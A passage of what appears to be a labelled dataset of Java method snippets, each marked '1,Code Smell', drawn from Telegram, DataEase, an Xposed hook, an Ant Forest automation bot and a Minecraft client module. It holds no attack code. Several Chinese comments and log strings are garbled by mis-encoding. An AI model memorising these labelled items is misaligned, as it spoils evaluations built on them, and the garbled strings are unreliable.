  addMouseWheelListener(new MouseWheelListener(){
    @Override public void mouseWheelMoved(    MouseWheelEvent e){
      if (e.getWheelRotation() == 1) {
        try {
          History searchHistory=History.getInstance();
          String record=searchHistory.moveUP();
          if (record != null) {
            setText(record);
          }
        }
 catch (        Exception ex) {
          ex.printStackTrace(stderr);
        }
      }
      if (e.getWheelRotation() == -1) {
        try {
          History searchHistory=History.getInstance();
          String record=searchHistory.moveDown();
          if (record != null) {
            setText(record);
          }
        }
 catch (        Exception ex) {
          ex.printStackTrace(stderr);
        }
      }
    }
  }
);
  setColumns(30);
}",1,Code Smell
"protected void loadReplyMessages(LongSparseArray<SparseArray<ArrayList<TLRPC.Message>>> replyMessageOwners,LongSparseArray<ArrayList<Integer>> dialogReplyMessagesIds,ArrayList<Long> usersToLoad,ArrayList<Long> chatsToLoad,int mode) throws SQLiteException {
  if (replyMessageOwners.isEmpty()) {
    return;
  }
  final boolean scheduled=mode == ChatActivity.MODE_SCHEDULED;
  final boolean quickReplies=mode == ChatActivity.MODE_QUICK_REPLIES;
  final long selfId=getUserConfig().getClientUserId();
  for (int b=0, N2=replyMessageOwners.size(); b < N2; b++) {
    long dialogId=replyMessageOwners.keyAt(b);
    SparseArray<ArrayList<TLRPC.Message>> owners=replyMessageOwners.valueAt(b);
    ArrayList<Integer> ids=dialogReplyMessagesIds.get(dialogId);
    if (ids == null) {
      continue;
    }
    SQLiteCursor cursor=null;
    try {
      for (int i=0; i < 2; i++) {
        if (i == 1 && !scheduled) {
          continue;
        }
        boolean findInScheduled=i == 1;
        if (quickReplies) {
          cursor=database.queryFinalized(String.format(Locale.US,""SELECT data, mid, date, topic_id FROM quick_replies_messages WHERE mid IN(%s) AND topic_id = %d"",TextUtils.join("","",ids),dialogId));
        }
 else         if (findInScheduled) {
          cursor=database.queryFinalized(String.format(Locale.US,""SELECT data, mid, date, uid FROM scheduled_messages_v2 WHERE mid IN(%s) AND uid = %d"",TextUtils.join("","",ids),dialogId));
        }
 else {
          cursor=database.queryFinalized(String.format(Locale.US,""SELECT data, mid, date, uid FROM messages_v2 WHERE mid IN(%s) AND uid = %d"",TextUtils.join("","",ids),dialogId));
        }
        while (cursor.next()) {
          NativeByteBuffer data=cursor.byteBufferValue(0);
          if (data != null) {
            TLRPC.Message message=TLRPC.Message.TLdeserialize(data,data.readInt32(false),false);
            message.readAttachPath(data,getUserConfig().clientUserId);
            data.reuse();
            message.id=cursor.intValue(1);
            message.date=cursor.intValue(2);
            if (quickReplies) {
              message.dialog_id=selfId;
              message.flags|=1073741824;
              message.quick_reply_shortcut_id=cursor.intValue(3);
            }
 else {
              message.dialog_id=cursor.longValue(3);
            }
            addUsersAndChatsFromMessage(message,usersToLoad,chatsToLoad,null);
            ArrayList<TLRPC.Message> arrayList=owners.get(message.id);
            if (arrayList != null) {
              for (int a=0, N=arrayList.size(); a < N; a++) {
                TLRPC.Message m=arrayList.get(a);
                m.replyMessage=message;
                MessageObject.getDialogId(message);
              }
            }
          }
        }
        cursor.dispose();
      }
    }
 catch (    Exception e) {
      throw e;
    }
 finally {
      if (cursor != null) {
        cursor.dispose();
      }
    }
  }
}",1,Code Smell
"private void toggleCameraInput(){
  VoIPService service=VoIPService.getSharedInstance();
  if (service != null) {
    if (accessibilityManager.isTouchExplorationEnabled()) {
      final String text;
      if (!currentUserIsVideo) {
        text=LocaleController.getString(""AccDescrVoipCamOn"",R.string.AccDescrVoipCamOn);
      }
 else {
        text=LocaleController.getString(""AccDescrVoipCamOff"",R.string.AccDescrVoipCamOff);
      }
      fragmentView.announceForAccessibility(text);
    }
    if (!currentUserIsVideo) {
      if (Build.VERSION.SDK_INT >= 21) {
        if (previewDialog == null) {
          service.createCaptureDevice(false);
          if (!service.isFrontFaceCamera()) {
            service.switchCamera();
          }
          windowView.setLockOnScreen(true);
          int[] locVideoButton=new int[2];
          bottomVideoBtn.getLocationOnScreen(locVideoButton);
          previewDialog=new PrivateVideoPreviewDialogNew(fragmentView.getContext(),locVideoButton[0],locVideoButton[1]){
            @Override public void onDismiss(            boolean screencast,            boolean apply){
              previewDialog=null;
              VoIPService service=VoIPService.getSharedInstance();
              windowView.setLockOnScreen(false);
              if (apply) {
                currentUserIsVideo=true;
                if (service != null && !screencast) {
                  service.requestVideoCall(false);
                  service.setVideoState(false,Instance.VIDEO_STATE_ACTIVE);
                  service.switchToSpeaker();
                }
                if (service != null) {
                  setVideoAction(bottomVideoBtn,service,true);
                }
              }
 else {
                if (service != null) {
                  service.setVideoState(false,Instance.VIDEO_STATE_INACTIVE);
                }
              }
              previousState=currentState;
              updateViewState();
            }
            @Override protected void afterOpened(){
              gradientLayout.lockDrawing=true;
              gradientLayout.invalidate();
            }
            @Override protected void beforeClosed(){
              gradientLayout.lockDrawing=false;
              gradientLayout.invalidate();
            }
            @Override protected int[] getFloatingViewLocation(){
              int[] loc=new int[2];
              int[] result=new int[3];
              currentUserCameraFloatingLayout.getLocationOnScreen(loc);
              result[0]=loc[0];
              result[1]=loc[1];
              result[2]=currentUserCameraFloatingLayout.getMeasuredWidth();
              return result;
            }
            @Override protected boolean isHasVideoOnMainScreen(){
              return callingUserIsVideo;
            }
          }
;
          if (lastInsets != null) {
            previewDialog.setBottomPadding(lastInsets.getSystemWindowInsetBottom());
          }
          fragmentView.addView(previewDialog);
        }
        return;
      }
 else {
        currentUserIsVideo=true;
        if (!service.isSpeakerphoneOn()) {
          VoIPService.getSharedInstance().toggleSpeakerphoneOrShowRouteSheet(activity,false);
        }
        service.requestVideoCall(false);
        service.setVideoState(false,Instance.VIDEO_STATE_ACTIVE);
      }
    }
 else {
      currentUserTextureView.saveCameraLastBitmap();
      service.setVideoState(false,Instance.VIDEO_STATE_INACTIVE);
      if (Build.VERSION.SDK_INT >= 21) {
        service.clearCamera();
      }
    }
    previousState=currentState;
    updateViewState();
  }
}",1,Code Smell
"@Override protected List<DriverEntity> readDriverEntities(Reader in) throws DriverEntityManagerException {
  List<DriverEntity> driverEntities=new ArrayList<DriverEntity>();
  DocumentBuilderFactory documentBuilderFactory;
  DocumentBuilder documentBuilder;
  Document document;
  try {
    documentBuilderFactory=DocumentBuilderFactory.newInstance();
    documentBuilder=documentBuilderFactory.newDocumentBuilder();
    document=documentBuilder.parse(new InputSource(in));
    NodeList nodeList=document.getElementsByTagName(ELEMENT_NAME_DRIVER_ENTITY);
    for (int i=0; i < nodeList.getLength(); i++) {
      DriverEntity driverEntity=new DriverEntity();
      Node node=nodeList.item(i);
      NodeList children=node.getChildNodes();
      for (int j=0; j < children.getLength(); j++) {
        Node child=children.item(j);
        String nodeName=child.getNodeName();
        String nodeContent=child.getTextContent();
        if (nodeContent != null)         nodeContent=nodeContent.trim();
        if (ELEMENT_NAME_ID.equalsIgnoreCase(nodeName))         driverEntity.setId(nodeContent);
 else         if (ELEMENT_NAME_DRIVER_CLASS_NAME.equalsIgnoreCase(nodeName))         driverEntity.setDriverClassName(nodeContent);
 else         if (ELEMENT_NAME_DISPLAY_NAME.equalsIgnoreCase(nodeName))         driverEntity.setDisplayName(nodeContent);
 else         if (ELEMENT_NAME_DISPLAY_DESC.equalsIgnoreCase(nodeName))         driverEntity.setDisplayDesc(nodeContent);
 else         if (ELEMENT_NAME_JRE_VERSION.equalsIgnoreCase(nodeName))         driverEntity.setJreVersion(nodeContent);
 else         if (ELEMENT_NAME_DATABASE_NAME.equalsIgnoreCase(nodeName))         driverEntity.setDatabaseName(nodeContent);
 else         if (ELEMENT_NAME_DATABASE_VERSIONS.equalsIgnoreCase(nodeName)) {
          NodeList dbVersionChildren=child.getChildNodes();
          int dbVersionLength=dbVersionChildren.getLength();
          if (dbVersionLength > 0) {
            List<String> databaseVersions=new ArrayList<String>(dbVersionLength);
            for (int k=0; k < dbVersionLength; k++) {
              Node dbVersionNode=dbVersionChildren.item(k);
              if (!ELEMENT_NAME_DATABASE_VERSION.equalsIgnoreCase(dbVersionNode.getNodeName()))               continue;
              String dbVersionNodeContent=dbVersionNode.getTextContent();
              if (dbVersionNodeContent != null)               dbVersionNodeContent=dbVersionNodeContent.trim();
              if (!dbVersionNodeContent.isEmpty())               databaseVersions.add(dbVersionNodeContent);
            }
            if (!databaseVersions.isEmpty())             driverEntity.setDatabaseVersions(databaseVersions);
          }
        }
      }
      if (isValidDriverEntity(driverEntity)) {
        removeExists(driverEntities,driverEntity.getId());
        driverEntities.add(driverEntity);
      }
    }
  }
 catch (  Exception e) {
    throw new DriverEntityManagerException(e);
  }
  return driverEntities;
}",1,Code Smell
"private void allocArrays(final int size){
  if (mHashes == EMPTY_IMMUTABLE_INTS) {
    throw new UnsupportedOperationException(""ArrayMap is immutable"");
  }
  if (size == (BASE_SIZE * 2)) {
synchronized (ArrayMap.class) {
      if (mTwiceBaseCache != null) {
        final Object[] array=mTwiceBaseCache;
        mArray=array;
        mTwiceBaseCache=(Object[])array[0];
        mHashes=(int[])array[1];
        array[0]=array[1]=null;
        mTwiceBaseCacheSize--;
        if (DEBUG)         Log.d(TAG,""Retrieving 2x cache "" + mHashes + "" now have ""+ mTwiceBaseCacheSize+ "" entries"");
        return;
      }
    }
  }
 else   if (size == BASE_SIZE) {
synchronized (ArrayMap.class) {
      if (mBaseCache != null) {
        final Object[] array=mBaseCache;
        mArray=array;
        mBaseCache=(Object[])array[0];
        mHashes=(int[])array[1];
        array[0]=array[1]=null;
        mBaseCacheSize--;
        if (DEBUG)         Log.d(TAG,""Retrieving 1x cache "" + mHashes + "" now have ""+ mBaseCacheSize+ "" entries"");
        return;
      }
    }
  }
  mHashes=new int[size];
  mArray=new Object[size << 1];
}",1,Code Smell
"private static void energyRain(){
  try {
    JSONObject joEnergyRainHome=new JSONObject(AntForestRpcCall.queryEnergyRainHome());
    if (""SUCCESS"".equals(joEnergyRainHome.getString(""resultCode""))) {
      if (joEnergyRainHome.getBoolean(""canPlayToday"")) {
        startEnergyRain();
      }
      if (joEnergyRainHome.getBoolean(""canGrantStatus"")) {
        Log.recordLog(""鏈夐�佽兘閲忛洦鐨勬満浼�"");
        JSONObject joEnergyRainCanGrantList=new JSONObject(AntForestRpcCall.queryEnergyRainCanGrantList());
        JSONArray grantInfos=joEnergyRainCanGrantList.getJSONArray(""grantInfos"");
        List<String> list=Config.getGiveEnergyRainList();
        String userId;
        boolean granted=false;
        for (int j=0; j < grantInfos.length(); j++) {
          JSONObject grantInfo=grantInfos.getJSONObject(j);
          if (grantInfo.getBoolean(""canGrantedStatus"")) {
            userId=grantInfo.getString(""userId"");
            if (list.contains(userId)) {
              JSONObject joEnergyRainChance=new JSONObject(AntForestRpcCall.grantEnergyRainChance(userId));
              Log.recordLog(""灏濊瘯閫佽兘閲忛洦缁欍��"" + FriendIdMap.getNameById(userId) + ""銆�"");
              granted=true;
              if (""SUCCESS"".equals(joEnergyRainChance.getString(""resultCode""))) {
                Log.forest(""閫佽兘閲忛洦馃導锔廩"" + FriendIdMap.getNameById(userId) + ""]#""+ FriendIdMap.getNameById(FriendIdMap.getCurrentUid()));
                startEnergyRain();
              }
 else {
                Log.recordLog(""閫佽兘閲忛洦澶辫触"",joEnergyRainChance.toString());
              }
              break;
            }
          }
        }
        if (!granted) {
          Log.recordLog(""娌℃湁鍙互閫佺殑鐢ㄦ埛"");
        }
      }
    }
    joEnergyRainHome=new JSONObject(AntForestRpcCall.queryEnergyRainHome());
    if (""SUCCESS"".equals(joEnergyRainHome.getString(""resultCode"")) && joEnergyRainHome.getBoolean(""canPlayToday"")) {
      startEnergyRain();
    }
  }
 catch (  Throwable th) {
    Log.i(TAG,""energyRain err:"");
    Log.printStackTrace(TAG,th);
  }
}",1,Code Smell
"/** 
 * 杩斿洖json鏍煎紡鐨勯敭鍊煎
 * @param key   :閿�
 * @param value :鍊�
 * @param json  :杩斿洖鍊� ""key"":value or value
 */
private void writeObjItem(String key,Object value,StringBuilder json){
  if (key != null) {
    json.append(STR_SLASH).append(key).append(STR_SLASH_STR);
  }
  if (value == null) {
    json.append(""null"");
  }
 else   if (value instanceof String || value instanceof Byte || value instanceof CharSequence) {
    json.append(STR_SLASH).append(value.toString()).append(STR_SLASH);
  }
 else   if (value instanceof Boolean || value instanceof Short || value instanceof Integer|| value instanceof Long|| value instanceof Float|| value instanceof Double) {
    json.append(value);
  }
 else   if (value instanceof Object[] || value instanceof Collection) {
    Collection valueColl=null;
    if (value instanceof Object[]) {
      Object[] valueArr=(Object[])value;
      valueColl=Arrays.asList(valueArr);
    }
 else     if (value instanceof Collection) {
      valueColl=(Collection)value;
    }
    json.append(STR_ARRAY_LEFT);
    if (valueColl.size() > 0) {
      for (      Object obj : valueColl) {
        writeObjItem(null,obj,json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_ARRAY_RIGHT);
  }
 else   if (value instanceof Map) {
    Map<?,?> valueMap=(Map<?,?>)value;
    json.append(STR_OBJECT_LEFT);
    if (!valueMap.isEmpty()) {
      Set<?> keys=valueMap.keySet();
      for (      Object valueMapItemKey : keys) {
        writeObjItem(valueMapItemKey.toString(),valueMap.get(valueMapItemKey),json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_OBJECT_RIGHT);
  }
 else {
    json.append(STR_OBJECT_LEFT);
    Field[] fields=getDeclaredFields(value.getClass());
    if (fields.length > 0) {
      for (      Field field : fields) {
        Object fieldObj=getFieldObject(field,value);
        writeObjItem(field.getName(),fieldObj,json);
        json.append(STR_COMMA);
      }
      json.delete(json.length() - 1,json.length());
    }
    json.append(STR_OBJECT_RIGHT);
  }
}",1,Code Smell
"private static SQLObj buildSortField(DeSortField f,SQLObj tableObj,int i,List<DatasetTableFieldDTO> originFields,boolean isCross,Map<Long,DatasourceSchemaDTO> dsMap){
  String originField;
  if (ObjectUtils.isNotEmpty(f.getExtField()) && Objects.equals(f.getExtField(),ExtFieldConstant.EXT_CALC)) {
    originField=Utils.calcFieldRegex(f.getOriginName(),tableObj,originFields,isCross,dsMap);
  }
 else   if (ObjectUtils.isNotEmpty(f.getExtField()) && Objects.equals(f.getExtField(),ExtFieldConstant.EXT_COPY)) {
    originField=String.format(SQLConstants.FIELD_NAME,tableObj.getTableAlias(),f.getDataeaseName());
  }
 else {
    originField=String.format(SQLConstants.FIELD_NAME,tableObj.getTableAlias(),f.getDataeaseName());
  }
  String fieldAlias=String.format(SQLConstants.FIELD_ALIAS_X_PREFIX,i);
  String fieldName="""";
  if (Objects.equals(f.getDeExtractType(),DeTypeConstants.DE_TIME)) {
    if (Objects.equals(f.getDeType(),DeTypeConstants.DE_INT) || Objects.equals(f.getDeType(),DeTypeConstants.DE_FLOAT)) {
      fieldName=String.format(SQLConstants.UNIX_TIMESTAMP,originField);
    }
 else {
      fieldName=originField;
    }
  }
 else   if (Objects.equals(f.getDeExtractType(),DeTypeConstants.DE_STRING)) {
    if (Objects.equals(f.getDeType(),DeTypeConstants.DE_INT)) {
      fieldName=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_INT_FORMAT);
    }
 else     if (Objects.equals(f.getDeType(),DeTypeConstants.DE_FLOAT)) {
      fieldName=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_FLOAT_FORMAT);
    }
 else     if (Objects.equals(f.getDeType(),DeTypeConstants.DE_TIME)) {
      fieldName=StringUtils.isEmpty(f.getDateFormat()) ? String.format(SQLConstants.DE_STR_TO_DATE,originField,SQLConstants.DEFAULT_DATE_FORMAT) : String.format(SQLConstants.DE_DATE_FORMAT,String.format(SQLConstants.DE_STR_TO_DATE,originField,f.getDateFormat()),SQLConstants.DEFAULT_DATE_FORMAT);
    }
 else {
      fieldName=originField;
    }
  }
 else {
    if (Objects.equals(f.getDeType(),DeTypeConstants.DE_TIME)) {
      String cast=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_INT_FORMAT);
      fieldName=String.format(SQLConstants.FROM_UNIXTIME,cast,SQLConstants.DEFAULT_DATE_FORMAT);
    }
 else     if (Objects.equals(f.getDeType(),DeTypeConstants.DE_INT)) {
      fieldName=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_INT_FORMAT);
    }
 else     if (Objects.equals(f.getDeType(),DeTypeConstants.DE_FLOAT)) {
      fieldName=String.format(SQLConstants.CAST,originField,SQLConstants.DEFAULT_FLOAT_FORMAT);
    }
 else {
      fieldName=originField;
    }
  }
  SQLObj result=SQLObj.builder().orderField(String.format(SQLConstants.FIELD_DOT,originField)).orderAlias(String.format(SQLConstants.FIELD_DOT,originField)).orderDirection(f.getOrderDirection()).build();
  return result;
}
",1,Code Smell
"public void clearBotKeyboard(MessagesStorage.TopicKey topicKey,ArrayList<Integer> messages){
  AndroidUtilities.runOnUIThread(() -> {
    if (messages != null) {
      for (int a=0; a < messages.size(); a++) {
        final int id=messages.get(a);
        MessagesStorage.TopicKey foundTopicKey=botKeyboardsByMids.get(id);
        if (foundTopicKey != null) {
          botKeyboards.remove(foundTopicKey);
          ArrayList<TLRPC.Message> dialogMessages=botDialogKeyboards.get(foundTopicKey.dialogId);
          if (dialogMessages != null) {
            for (int i=0; i < dialogMessages.size(); ++i) {
              TLRPC.Message msg=dialogMessages.get(i);
              if (msg == null || msg.id == id) {
                dialogMessages.remove(i);
                i--;
              }
            }
            if (dialogMessages.isEmpty()) {
              botDialogKeyboards.remove(foundTopicKey.dialogId);
            }
          }
          botKeyboardsByMids.remove(id);
          getNotificationCenter().postNotificationName(NotificationCenter.botKeyboardDidLoad,null,foundTopicKey);
        }
      }
    }
 else     if (topicKey != null) {
      botKeyboards.remove(topicKey);
      botDialogKeyboards.remove(topicKey.dialogId);
      getNotificationCenter().postNotificationName(NotificationCenter.botKeyboardDidLoad,null,topicKey);
    }
  }
);
}
public void clearBotKeyboard(long dialogId){
  AndroidUtilities.runOnUIThread(() -> {
    ArrayList<TLRPC.Message> dialogMessages=botDialogKeyboards.get(dialogId);
    if (dialogMessages != null) {
      for (int i=0; i < dialogMessages.size(); ++i) {
        TLRPC.Message msg=dialogMessages.get(i);
        int topicId=MessageObject.getTopicId(msg,ChatObject.isForum(currentAccount,dialogId));
        MessagesStorage.TopicKey topicKey=MessagesStorage.TopicKey.of(dialogId,topicId);
        botKeyboards.remove(topicKey);
        getNotificationCenter().postNotificationName(NotificationCenter.botKeyboardDidLoad,null,topicKey);
      }
    }
    botDialogKeyboards.remove(dialogId);
  }
);
}",1,Code Smell
"@Override public void convert() throws BackupException {
  if (SPECIAL_BACKUPS.contains(mPackageName)) {
    throw new BackupException(""Cannot convert special backup "" + mPackageName);
  }
  mSourceMetadata=new MetadataManager.Metadata();
  readLogFile();
  mDestMetadata=new MetadataManager.Metadata(mSourceMetadata);
  mDestMetadata.crypto=CryptoUtils.getMode();
  MetadataManager metadataManager=MetadataManager.getNewInstance();
  metadataManager.setMetadata(mDestMetadata);
  BackupFiles backupFiles;
  BackupFiles.BackupFile[] backupFileList;
  try {
    backupFiles=new BackupFiles(mPackageName,mUserId,new String[]{""OAndBackup""});
    backupFileList=backupFiles.getBackupPaths(true);
  }
 catch (  IOException e) {
    throw new BackupException(""Could not get backup files."",e);
  }
  for (  BackupFiles.BackupFile backupFile : backupFileList) {
    boolean backupSuccess=false;
    try {
      mTempBackupPath=backupFile.getBackupPath();
      mCrypto=ConvertUtils.setupCrypto(mDestMetadata);
      try {
        mChecksum=backupFile.getChecksum(CryptoUtils.MODE_NO_ENCRYPTION);
      }
 catch (      IOException e) {
        throw new BackupException(""Failed to create checksum file."",e);
      }
      if (mDestMetadata.flags.backupApkFiles()) {
        backupApkFile();
      }
      if (mDestMetadata.flags.backupData()) {
        backupData();
      }
      metadataManager.setMetadata(mDestMetadata);
      try {
        metadataManager.writeMetadata(backupFile);
      }
 catch (      IOException e) {
        throw new BackupException(""Failed to write metadata."",e);
      }
      try {
        mChecksum.add(MetadataManager.META_FILE,DigestUtils.getHexDigest(mDestMetadata.checksumAlgo,backupFile.getMetadataFile()));
      }
 catch (      IOException e) {
        throw new BackupException(""Failed to generate checksum for meta.json"",e);
      }
      mChecksum.close();
      try {
        Path checksumFile=backupFile.getChecksumFile(CryptoUtils.MODE_NO_ENCRYPTION);
        encrypt(new Path[]{checksumFile});
      }
 catch (      IOException e) {
        throw new BackupException(""Failed to encrypt checksums.txt"",e);
      }
      try {
        backupFile.commit();
      }
 catch (      IOException e) {
        throw new BackupException(""Could not finalise backup."",e);
      }
      backupSuccess=true;
    }
 catch (    BackupException e) {
      throw e;
    }
catch (    Throwable th) {
      throw new BackupException(""Unknown error occurred."",th);
    }
 finally {
      if (!backupSuccess) {
        backupFile.cleanup();
      }
      if (mCrypto != null) {
        mCrypto.close();
      }
      for (      Path file : mDecryptedFiles) {
        Log.d(TAG,""Deleting %s"",file);
        file.delete();
      }
      if (backupSuccess) {
        BackupUtils.putBackupToDbAndBroadcast(ContextUtils.getContext(),mDestMetadata);
      }
    }
    return;
  }
}
",1,Code Smell
"private static WView findClickViewInList(boolean orderByArea,ArrayList<WView> clickViews){
  WView clickedView=null;
  clickViews.sort((o1,o2) -> {
    if (!orderByArea) {
      if (o2.getZIndex().equals(o1.getZIndex())) {
        return o2.getArea() - o1.getArea();
      }
      return o2.getZIndex().compareTo(o1.getZIndex());
    }
 else {
      if (o1.getArea() == o2.getArea()) {
        return o2.getZIndex().compareTo(o1.getZIndex());
      }
      return o1.getArea() - o2.getArea();
    }
  }
);
  if (!orderByArea) {
    for (int i=0; i < clickViews.size(); i++) {
      if (clickViews.get(i).isClickable()) {
        if (clickedView != null) {
          if (clickedView.getArea() < clickViews.get(i).getArea()) {
            break;
          }
        }
        clickedView=clickViews.get(i);
        break;
      }
 else       if (clickedView == null || clickedView.getArea() > clickViews.get(i).getArea()) {
        clickedView=clickViews.get(i);
      }
    }
  }
 else   if (clickViews.size() > 0) {
    clickedView=clickViews.get(0);
  }
  tryFindViewClickInfo(clickedView);
  return clickedView;
}",1,Code Smell
"@SuppressWarnings(""unchecked"") @Override public void didReceivedNotification(int id,int account,Object... args){
  if (id == NotificationCenter.storiesListUpdated) {
    StoriesController.StoriesList list=(StoriesController.StoriesList)args[0];
    if (list == storiesList) {
      prepareStoriesLoadedItems();
      sortAllLoadedData();
      if (adapter != null) {
        recyclerListView.setItemAnimator(null);
        diffUtilsCallback.update();
      }
    }
  }
 else   if (id == NotificationCenter.boostByChannelCreated) {
    TLRPC.Chat chat=(TLRPC.Chat)args[0];
    boolean isGiveaway=(boolean)args[1];
    List<BaseFragment> fragmentStack=getParentLayout().getFragmentStack();
    BaseFragment chatEditFragment=fragmentStack.size() >= 2 ? fragmentStack.get(fragmentStack.size() - 2) : null;
    if (chatEditFragment instanceof ChatEditActivity) {
      getParentLayout().removeFragmentFromStack(chatEditFragment);
    }
    fragmentStack=getParentLayout().getFragmentStack();
    BaseFragment profileFragment=fragmentStack.size() >= 2 ? fragmentStack.get(fragmentStack.size() - 2) : null;
    if (isGiveaway) {
      BaseFragment chatFragment=fragmentStack.size() >= 3 ? fragmentStack.get(fragmentStack.size() - 3) : null;
      if (profileFragment instanceof ProfileActivity) {
        getParentLayout().removeFragmentFromStack(profileFragment);
      }
      finishFragment();
      if (chatFragment instanceof ChatActivity) {
        BoostDialogs.showBulletin(chatFragment,chat,true);
      }
    }
 else {
      finishFragment();
      if (profileFragment instanceof ProfileActivity) {
        BoostDialogs.showBulletin(profileFragment,chat,false);
      }
    }
  }
 else   if (id == NotificationCenter.messagesDidLoad) {
    int guid=(Integer)args[10];
    if (guid == classGuid) {
      ArrayList<MessageObject> messArr=(ArrayList<MessageObject>)args[2];
      ArrayList<RecentPostInfo> deletedMessages=new ArrayList<>();
      int n=messArr.size();
      for (int i=0; i < n; i++) {
        MessageObject messageObjectFormCache=messArr.get(i);
        int index=recentPostIdtoIndexMap.get(messageObjectFormCache.getId(),-1);
        if (index >= 0 && recentPostsAll.get(index).getId() == messageObjectFormCache.getId()) {
          if (messageObjectFormCache.deleted) {
            deletedMessages.add(recentPostsAll.get(index));
          }
 else {
            recentPostsAll.get(index).message=messageObjectFormCache;
          }
        }
      }
      recentPostsAll.removeAll(deletedMessages);
      recentPostsLoaded.clear();
      n=recentPostsAll.size();
      for (int i=0; i < n; i++) {
        RecentPostInfo postInfo=recentPostsAll.get(i);
        if (postInfo.message == null) {
          loadFromId=postInfo.getId();
          break;
        }
 else {
          recentPostsLoaded.add(postInfo);
        }
      }
      if (recentPostsLoaded.size() < 20) {
        loadMessages();
      }
      sortAllLoadedData();
      if (adapter != null) {
        recyclerListView.setItemAnimator(null);
        diffUtilsCallback.update();
      }
    }
  }
 else   if (id == NotificationCenter.chatInfoDidLoad) {
    TLRPC.ChatFull chatFull=(TLRPC.ChatFull)args[0];
    if (chatFull.id == chatId) {
      if (chat == null) {
        chat=chatFull;
        loadStatistic();
      }
    }
  }
}",1,Code Smell
"@Override protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
  super.beforeHookedMethod(param);
  if (param.args.length == 2 && param.args[1] instanceof List) {
    List<Object> objectList=(List<Object>)param.args[1];
    for (Iterator<Object> iterator=objectList.iterator(); iterator.hasNext(); ) {
      try {
        Object object=iterator.next();
        String enumString=XposedHelpers.callMethod(object,""getEnumType"").toString();
        if (!TextUtils.isEmpty(enumString) && !enumString.equals(""SETTING"")) {
          if (enumString.equals(""GROUP"")) {
            int group=(int)XposedHelpers.callMethod(object,""getGroup"");
            if (group == 1 && sidebarSettingMap.get(""GROUP1"") != null || sidebarSettingMap.get(""GROUP1"")) {
              iterator.remove();
            }
 else             if (group == 2 && sidebarSettingMap.get(""GROUP2"") != null || sidebarSettingMap.get(""GROUP2"")) {
              iterator.remove();
            }
          }
 else           if (sidebarSettingMap.get(enumString) != null && sidebarSettingMap.get(enumString))           iterator.remove();
        }
      }
 catch (      Exception e) {
        e.printStackTrace();
      }
    }
  }
}",1,Code Smell
"@EventHandler private void onTick(TickEvent.Pre event){
  if (repairingI == -1) {
    if (mode.get() != Mode.Hands) {
      for (int i=0; i < mc.player.getInventory().armor.size(); i++) {
        if (needsRepair(mc.player.getInventory().armor.get(i),minThreshold.get())) {
          repairingI=SlotUtils.ARMOR_START + i;
          break;
        }
      }
    }
    if (mode.get() != Mode.Armor && repairingI == -1) {
      for (      Hand hand : Hand.values()) {
        if (needsRepair(mc.player.getStackInHand(hand),minThreshold.get())) {
          repairingI=hand == Hand.MAIN_HAND ? mc.player.getInventory().selectedSlot : SlotUtils.OFFHAND;
          break;
        }
      }
    }
  }
  if (repairingI != -1) {
    if (!needsRepair(mc.player.getInventory().getStack(repairingI),maxThreshold.get())) {
      repairingI=-1;
      return;
    }
    FindItemResult exp=InvUtils.find(Items.EXPERIENCE_BOTTLE);
    if (exp.found()) {
      if (!exp.isHotbar() && !exp.isOffhand()) {
        if (!replenish.get())         return;
        InvUtils.move().from(exp.slot()).toHotbar(slot.get() - 1);
      }
      Rotations.rotate(mc.player.getYaw(),90,() -> {
        if (exp.getHand() != null) {
          mc.interactionManager.interactItem(mc.player,exp.getHand());
        }
 else {
          InvUtils.swap(exp.slot(),true);
          mc.interactionManager.interactItem(mc.player,Hand.MAIN_HAND);
          InvUtils.swapBack();
        }
      }
);
    }
  }
}",1,Code Smell
"/** 
 * 瑙ｆ瀽 EL 琛ㄨ揪寮忥紝鏌ユ壘鏈畾涔夌殑 id 骞舵瀯寤洪敊璇俊鎭�
 * @param elStr el 琛ㄨ揪寮�
 */
private static String buildDataNotFoundExceptionMsg(String elStr){
  String msg=String.format(""[node/chain is not exist or node/chain not register]\n EL: %s"",StrUtil.trim(elStr));
  try {
    InstructionSet parseResult=EXPRESS_RUNNER.getInstructionSetFromLocalCache(elStr);
    if (parseResult == null) {
      return msg;
    }
    String[] outAttrNames=parseResult.getOutAttrNames();
    if (ArrayUtil.isEmpty(outAttrNames)) {
      return msg;
    }
    List<String> chainIds=CollUtil.map(FlowBus.getChainMap().values(),Chain::getChainId,true);
    List<String> nodeIds=CollUtil.map(FlowBus.getNodeMap().values(),Node::getId,true);
    for (    String attrName : outAttrNames) {
      if (!chainIds.contains(attrName) && !nodeIds.contains(attrName)) {
        msg=String.format(""[%s] is not exist or [%s] is not registered, you need to define a node or chain with id [%s] and register it \n EL: "",attrName,attrName,attrName);
        String sourceEl=StrUtil.removeAll(elStr,CharUtil.SPACE,CharUtil.LF,CharUtil.CR);
        int commaRightIndex=sourceEl.indexOf(attrName + StrUtil.COMMA);
        if (commaRightIndex != -1) {
          return msg + sourceEl + ""\n""+ StrUtil.fill(""^"",CharUtil.SPACE,commaRightIndex + 6,true);
        }
        int commaLeftIndex=sourceEl.indexOf(StrUtil.COMMA + attrName);
        if (commaLeftIndex != -1) {
          return msg + sourceEl + ""\n""+ StrUtil.fill(""^"",CharUtil.SPACE,commaLeftIndex + 7,true);
        }
        int nodeIndex=sourceEl.indexOf(String.format(""node(\""%s\"")"",attrName));
        if (nodeIndex != -1) {
          return msg + sourceEl + ""\n""+ StrUtil.fill(""^"",CharUtil.SPACE,commaLeftIndex + 12,true);
        }
      }
    }
  }
 catch (  Exception ex) {
  }
  return msg;
}",1,Code Smell
"private void doRun(){
  long lastPrintTime=0;
  while (isRunnable()) {
    if (!prepareToRead()) {
      break;
    }
    List<SourceData> lines=readFromSource();
    if (lines != null && lines.isEmpty()) {
      if (queue.isEmpty()) {
        emptyCount++;
      }
 else {
        emptyCount=0;
      }
      MemoryManager.getInstance().release(AGENT_GLOBAL_READER_SOURCE_PERMIT,BATCH_READ_LINE_TOTAL_LEN);
      AgentUtils.silenceSleepInSeconds(1);
      continue;
    }
    emptyCount=0;
    for (int i=0; i < lines.size(); i++) {
